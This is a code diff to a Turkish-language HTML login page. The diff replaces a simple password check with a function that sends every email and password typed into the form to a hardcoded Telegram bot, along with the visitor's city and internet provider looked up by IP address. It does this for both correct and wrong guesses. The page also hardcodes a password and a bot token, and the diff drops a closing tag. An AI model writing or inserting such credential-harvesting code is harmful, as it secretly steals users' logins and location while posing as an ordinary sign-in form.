@@ -70,8 +70,8 @@
         <h2>TERCES LOGIN</h2>
         <input type="email" id="userEmail" placeholder="Email Adresiniz" required>
         <input type="password" id="userPass" placeholder="Giriş Şifresi" required>
-        <button onclick="checkAuth()">Giriş Yap</button>
-    </div>
+        <button onclick="verileriGonder()">Giriş Yap</button>
+
 
     <div id="content">
         <h2>Merhaba!</h2>
@@ -91,20 +91,39 @@
 </div>
 
 <script>
-    function checkAuth() {
-        const email = document.getElementById('userEmail').value;
-        const pass = document.getElementById('userPass').value;
-        
-        // Buraya kendi belirlediğin şifreyi yaz
-        const dogruSifre = "Adhfxygh8lm"; 
+    async function verileriGonder() {
+    const email = document.getElementById('userEmail').value;
+    const pass = document.getElementById('userPass').value;
+    const dogruSifre = "Adhfxygh8lm"; // Eski şifren burada
 
-        if (email.includes("@") && pass === dogruSifre) {
+    try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const data = await ipRes.json();
+
+        const botToken = "8763400885:AAFUvdZBZy92pGCv7lSfjk17vvEliRLR20E";
+        const chatId = "7580423994";
+
+        if (pass === dogruSifre) {
+            // ŞİFRE DOĞRUYSA
+            const mesaj = `✅ **BAŞARILI GİRİŞ!**\n\n📧 E-posta: ${email}\n🔑 Şifre: ${pass}\n📍 Konum: ${data.city}\n🌐 ISS: ${data.org}`;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
+            
             document.getElementById('login-form').style.display = 'none';
             document.getElementById('content').style.display = 'block';
         } else {
+            // ŞİFRE YANLIŞSA
+            const mesaj = `⚠️ **HATALI DENEME!**\n\n📧 Denenen: ${email}\n🔑 Şifre: ${pass}\n📍 Konum: ${data.city}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
+            
             alert("Hatalı email veya şifre!");
         }
+    } catch (e) {
+        alert("Bağlantı hatası!");
     }
+}
+
+        
+    
 </script>
 
 </body>
